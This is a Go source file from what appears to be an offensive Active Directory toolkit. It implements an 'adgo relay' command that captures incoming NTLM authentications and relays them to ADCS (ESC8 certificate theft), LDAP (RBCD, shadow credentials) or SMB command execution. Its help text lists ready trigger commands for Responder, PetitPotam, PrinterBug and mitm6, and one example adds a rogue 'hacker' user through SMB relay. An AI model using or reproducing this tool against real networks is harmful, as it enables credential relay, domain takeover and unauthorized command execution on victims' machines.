// cmd/adgo/commands/relay_cmd.go
//
// adgo relay — Serveur de relay NTLM natif
//
// Déclencher avec : Responder, mitm6, PetitPotam, PrinterBug (SpoolSS)
//
// Exemples :
//   # Relay vers ADCS (ESC8 — obtenir un certificat)
//   adgo relay --target 192.168.1.10 --type adcs
//
//   # Relay vers LDAP (dump, RBCD, shadow creds)
//   adgo relay --target 192.168.1.10:389 --type ldap
//
//   # Relay vers SMB (exec de commande)
//   adgo relay --target 192.168.1.20 --type smb --exec "net user hacker P@ss! /add"

package commands

import (
	"fmt"

	"adgo/pkg/common"
	"adgo/pkg/ntlm/relay"

	"github.com/spf13/cobra"
)

var RelayCmd = &cobra.Command{
	Use:   "relay",
	Short: "NTLM relay server — capture and relay NTLM auth to LDAP/SMB/ADCS",
	Long: `NTLM Relay server — capture incoming NTLM authentications and relay them.

Trigger options:
  Responder   : sudo responder -I eth0 -wd (disable SMB/HTTP in Responder.conf)
  PetitPotam  : python3 PetitPotam.py <RELAY_IP> <TARGET_DC>
  PrinterBug  : python3 printerbug.py domain/user:pass@<DC_IP> <RELAY_IP>
  mitm6       : sudo mitm6 -d lab.local

Attack types:
  adcs   — Relay to AD CS web enrollment (ESC8) → get a certificate → auth as DC
  ldap   — Relay to LDAP → dump, RBCD, shadow credentials
  smb    — Relay to SMB → execute commands

Examples:
  # ESC8: relay to ADCS, get certificate for DC machine account
  adgo relay --target 192.168.1.10 --type adcs --listen 0.0.0.0:80

  # RBCD: relay to LDAP, write RBCD on DC
  adgo relay --target 192.168.1.10:389 --type ldap

  # SMB exec
  adgo relay --target 192.168.1.20:445 --type smb --exec "whoami > C:\\Temp\\out.txt"`,
	RunE: runRelay,
}

var (
	relayTarget  string
	relayType    string
	relayListen  string
	relayExec    string
	relayVerbose bool
	relayHTTPS   bool
)

func init() {
	RelayCmd.Flags().StringVar(&relayTarget, "target", "", "Relay target (IP or IP:PORT) (required)")
	RelayCmd.Flags().StringVar(&relayType, "type", "smb", "Relay type: adcs, ldap, smb")
	RelayCmd.Flags().StringVar(&relayListen, "listen", "0.0.0.0:445", "Local address to listen on")
	RelayCmd.Flags().StringVar(&relayExec, "exec", "", "Command to execute after successful SMB relay")
	RelayCmd.Flags().BoolVar(&relayVerbose, "verbose", false, "Verbose output")
	RelayCmd.Flags().BoolVar(&relayHTTPS, "https", false, "Use HTTPS towards the target")
	RelayCmd.MarkFlagRequired("target")
}

func runRelay(cmd *cobra.Command, args []string) error {
	if relayTarget == "" {
		return fmt.Errorf("--target required")
	}

	var targetType relay.RelayTarget
	switch relayType {
	case "adcs", "http":
		targetType = relay.TargetHTTP
		if relayListen == "0.0.0.0:445" {
			relayListen = "0.0.0.0:80" // ADCS écoute sur HTTP
		}
	case "ldap":
		targetType = relay.TargetLDAP
		if !containsPort(relayTarget) {
			relayTarget += ":389"
		}
	case "smb":
		targetType = relay.TargetSMB
		if !containsPort(relayTarget) {
			relayTarget += ":445"
		}
	default:
		return fmt.Errorf("unknown relay type %q (use: adcs, ldap, smb)", relayType)
	}

	common.PrintInfo(fmt.Sprintf("NTLM Relay → %s (%s)", relayTarget, relayType))
	common.PrintWarning("Relay is active — waiting for incoming NTLM connections")
	common.PrintInfo("Trigger with: PetitPotam, Responder, PrinterBug, mitm6")
	fmt.Println()

	cfg := &relay.RelayConfig{
		ListenAddr:  relayListen,
		TargetAddr:  relayTarget,
		TargetType:  targetType,
		TargetHTTPS: relayHTTPS,
		Command:     relayExec,
		Verbose:     relayVerbose,
		OnSuccess: func(session *relay.RelaySession) {
			common.PrintSuccess(fmt.Sprintf("Relay SUCCESS from %s!", session.VictimIP))
			if session.VictimUser != "" {
				common.PrintFound("User", session.VictimUser)
			}
			common.LogSuccess(session.VictimIP, "NTLM relay success",
				map[string]interface{}{
					"target": relayTarget,
					"type":   relayType,
					"victim": session.VictimIP,
				},
			)
		},
	}

	server := relay.NewRelayServerFull(cfg)
	return server.Start()
}

func containsPort(addr string) bool {
	_, _, err := splitHostPort(addr)
	return err == nil
}

func splitHostPort(addr string) (string, string, error) {
	// Simple check — net.SplitHostPort would work too
	for i := len(addr) - 1; i >= 0; i-- {
		if addr[i] == ':' {
			return addr[:i], addr[i+1:], nil
		}
	}
	return addr, "", fmt.Errorf("no port")
}
